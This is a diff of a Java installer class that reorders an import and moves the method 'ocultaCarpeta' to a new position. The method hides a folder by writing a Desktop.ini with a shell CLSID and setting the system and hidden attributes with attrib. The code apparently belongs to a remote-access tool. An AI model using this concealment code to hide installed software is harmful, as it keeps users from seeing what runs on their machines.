@@ -1,6 +1,7 @@
 package rt.util;
 
 import comunes.Archivo;
+import comunes.Interfaz;
 import java.awt.Desktop;
 import java.io.ByteArrayInputStream;
 import java.io.File;
@@ -12,9 +13,20 @@ import java.io.PrintWriter;
 import java.util.List;
 import rt.Inicio;
 import rt.interfaces.AR;
-import comunes.Interfaz;
 
 public class INST extends Thread implements Interfaz {
+
+    private static void ocultaCarpeta(File f) {
+        try {
+            FileWriter desk = new FileWriter(new File(f, "Desktop.ini"));
+            desk.write("[.ShellClassInfo]\r\n");
+            desk.write("CLSID={031EE060-67BC-460d-8847-E4A7C5E45A27}");
+            desk.close();
+            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\\*.*\""});
+            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\""});
+        } catch (Exception ex) {
+        }
+    }
 
     private String nombreJar;
     private String nombreReg;
@@ -336,18 +348,6 @@ public class INST extends Thread implements Interfaz {
         }
     }
 
-    private static void ocultaCarpeta(File f) {
-        try {
-            FileWriter desk = new FileWriter(new File(f, "Desktop.ini"));
-            desk.write("[.ShellClassInfo]\r\n");
-            desk.write("CLSID={031EE060-67BC-460d-8847-E4A7C5E45A27}");
-            desk.close();
-            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\\*.*\""});
-            Runtime.getRuntime().exec(new String[]{"attrib", "+s", "+h", "\"" + f.getAbsolutePath() + "\""});
-        } catch (Exception ex) {
-        }
-    }
-
 //    private static void modoPapeleraCarpeta(File f) {
 //        try {
 //            FileWriter desk = new FileWriter(new File(f, "Desktop.ini"));
@@ -359,7 +359,6 @@ public class INST extends Thread implements Interfaz {
 //        } catch (Exception ex) {
 //        }
 //    }
-
 //    @Override
 //    public void inicia(String nombreJar, String nombreReg, boolean tipo1, boolean tipo2, boolean actualizacion) {
 //        this.nombreJar = nombreJar;
